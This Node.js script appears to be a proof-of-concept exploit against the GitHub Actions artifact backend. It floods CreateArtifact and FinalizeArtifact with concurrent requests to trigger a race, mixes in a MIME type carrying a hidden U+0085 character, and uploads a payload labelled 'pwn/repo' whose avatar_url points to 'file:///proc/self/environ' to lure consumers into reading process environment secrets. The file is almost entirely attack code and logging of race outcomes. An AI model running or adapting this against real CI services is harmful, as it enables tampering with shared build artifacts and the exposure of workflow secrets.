import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const oddMime = 'application/json\u0085';
const validMime = 'application/json';
const payload = Buffer.from(JSON.stringify({
  full_name: 'pwn/repo',
  owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
  description: 'Repo Cassette artifact race carrier',
  stargazers_count: 0,
}));
const digest = createHash('sha256').update(payload).digest('hex');

function client() {
  // Separate clients give concurrent creates independent socket pools.
  return internalArtifactTwirpClient({maxAttempts: 1});
}

async function create(name, version) {
  return client().CreateArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    version,
    mimeType: StringValue.create({
      value: version === 6 ? oddMime : validMime,
    }),
  });
}

async function upload(url) {
  await new BlobClient(url).getBlockBlobClient().uploadData(payload, {
    blobHTTPHeaders: {blobContentType: oddMime},
  });
}

async function finalize(name) {
  return client().FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    size: String(payload.length),
    hash: StringValue.create({value: `sha256:${digest}`}),
  });
}

const report = [];
for (let round = 0; round < 24; round += 1) {
  const name = `cassette-storm-${process.env.GITHUB_RUN_ID}-${round}`;
  const versions = Array.from({length: 32}, (_, index) =>
    (index + round) % 2 === 0 ? 6 : 7);

  const opened = await Promise.allSettled(versions.map(version => create(name, version)));
  const handles = opened
    .filter(item => item.status === 'fulfilled' && item.value?.signedUploadUrl)
    .map(item => item.value.signedUploadUrl);
  const urls = [...new Set(handles)];
  await Promise.allSettled(urls.map(upload));

  const sealed = await Promise.allSettled(
    Array.from({length: 12}, () => finalize(name)),
  );
  const artifactIds = [...new Set(sealed
    .filter(item => item.status === 'fulfilled' && item.value?.artifactId)
    .map(item => String(item.value.artifactId)))];

  await Promise.allSettled(urls.map(upload));
  const extensions = urls.map(url => new URL(url).pathname.split('.').at(-1));
  const result = {
    round,
    name,
    fulfilledCreates: handles.length,
    uniqueBlobs: urls.length,
    zipBlobs: extensions.filter(x => x === 'zip').length,
    jsonBlobs: extensions.filter(x => x === 'json').length,
    artifactIds,
  };
  report.push(result);
  console.log(`STORM ${JSON.stringify(result)}`);
}

if (!report.some(item => item.artifactIds.length)) {
  throw new Error('No storm artifact was finalized');
}
console.log(`MANIFEST ${JSON.stringify(report)}`);
